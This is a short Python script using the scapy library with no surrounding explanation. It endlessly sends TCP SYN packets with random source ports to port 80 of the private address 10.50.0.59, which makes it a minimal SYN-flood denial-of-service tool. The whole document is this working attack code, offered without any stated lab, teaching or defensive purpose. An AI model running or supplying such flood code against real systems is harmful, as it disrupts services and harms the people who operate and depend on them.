from scapy.all import *


p=IP( dst='10.50.0.59')/TCP(flags="S",  sport=RandShort(),  dport=int(80))
send(p, verbose=1, loop=1)

